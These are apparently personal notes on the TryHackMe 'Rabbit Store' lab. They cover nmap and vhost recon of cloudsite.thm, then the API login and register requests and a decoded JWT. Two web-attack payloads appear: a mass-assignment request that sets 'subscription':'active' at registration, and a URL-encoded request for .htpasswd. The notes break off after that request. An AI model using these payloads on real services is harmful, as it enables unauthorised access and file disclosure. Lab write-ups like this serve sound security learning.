---
title: Rabbit Store
description: TryHackMe Lab
---
## Recon
### nmap
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open   http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
3397/tcp  closed saposs
4369/tcp  open   epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
25672/tcp open   unknown
32469/tcp closed unknown
44774/tcp closed unknown
51612/tcp closed unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP 80
#### Site
Redirects to http://cloudsite.thm/
![](../../../../public/images/THM_RabbitStore_20250612%20_151713.png)

Login → http://storage.cloudsite.thm/
#### Tech Stack
cloudsite.thm
- Apache HTTP Server 2.4.52
- Ubuntu
- OWL Carousel
storage.cloudsite.thml
- Apache/2.4.52 (Ubuntu)
- Express
![](../../../../public/images/THM_RabbitStore_20250612%20_155656.png)
#### vhost
```bash
vhost-fuzzer cloudsite.thm ~/Wordlist/SecLists/Discovery/DNS/subdomains-top1million-20000.txt http://cloudsite.thm --fw 18                    03:26:51 pm

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cloudsite.thm
 :: Wordlist         : FUZZ:/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cloudsite.thm
 :: Header           : User-Agent: PENTEST
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 18
________________________________________________

storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 268ms]
```

#### api
```http
POST /api/login HTTP/1.1
Host: storage.cloudsite.thm
Content-Length: 42
Accept-Language: en-GB,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://storage.cloudsite.thm
Referer: http://storage.cloudsite.thm/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"test@test.com","password":"123"}
```

#### signup
```http
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
Content-Length: 50
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://storage.cloudsite.thm
Referer: http://storage.cloudsite.thm/register.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"john@test.com","password":"password123"}
```

#### sign up user
http://storage.cloudsite.thm/dashboard/inactive
![](../../../../public/images/PS_RabbitStore_20250612%20_154642.png)

#### JWT
```http
GET /dashboard/active HTTP/1.1
Host: storage.cloudsite.thm
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImpvaG5AdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0OTcwNzEyOSwiZXhwIjoxNzQ5NzEwNzI5fQ.bAvx1OLSliPZLY7cv0It7TcOAnka4ip4XtSsMoOWZGE
Connection: keep-alive
```

```json
jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImpvaG5AdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0OTcwNzEyOSwiZXhwIjoxNzQ5NzEwNzI5fQ.bAvx1OLSliPZLY7cv0It7TcOAnka4ip4XtSsMoOWZGE
```

```json
Headers = {
  "alg": "HS256",
  "typ": "JWT"
}

Payload = {
  "email": "john@test.com",
  "subscription": "inactive",
  "iat": 1749707129,
  "exp": 1749710729
}

Signature = "bAvx1OLSliPZLY7cv0It7TcOAnka4ip4XtSsMoOWZGE"
```

- server checks signature
- secret not crackable
### Mass assignment
Possible field of the user object.
![](../../../../public/images/THM_RabbitStore_20250612%20_164223.png)
`POST /api/register HTTP/1.1`

```json
{
	"email":"john2@test.com",
	"password":"password123",
}
```

```http
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
Content-Length: 73
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://storage.cloudsite.thm
Referer: http://storage.cloudsite.thm/register.html
Accept-Encoding: gzip, deflate, br
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImpvaG4yQHRlc3QuY29tIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NDk3MDc1OTksImV4cCI6MTc0OTcxMTE5OX0.6Z4Y28KYisl8K-Xx2IZ2t1tG9QjWeF1NYr0J1yjYgoM
Connection: keep-alive

{"email":"max@test.com","password":"test123",
"subscription":"active"
}
```
```http
HTTP/1.1 201 Created
Date: Thu, 12 Jun 2025 06:40:56 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 42
ETag: W/"2a-nMoFx54+czTntmSLXl3mqIsZV4A"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"message":"User registered successfully"}
```

![](../../../../public/images/THM_RabbitStore_20250612%20_164644.png)
![](../../../../public/images/THM_RabbitStore_20250612%20_164530.png)
### Path traversal
`.htpasswd`
```http
GET /assets/%2ehtpasswd HTTP/1.1
Host: storage.cloudsite.thm
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://storage.cloudsite.thm/assets/plugins/testimonial/
Accept-Encoding: gzip, deflate, br
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImpvaG4yQHRlc3QuY29tIiwic3Vic2NyaXB0aW9uIjoiaW5hY3RpdmUiLCJpYXQiOjE3NDk3MDc1OTksImV4cCI6MTc0OTcxMTE5OX0.6Z4Y28KYisl8K-Xx2IZ2t1tG9QjWeF1NYr0J1yjYgoM
Connection: keep-alive

```

![](../../../../public/images/THM_RabbitStore_20250612%20_162951.png)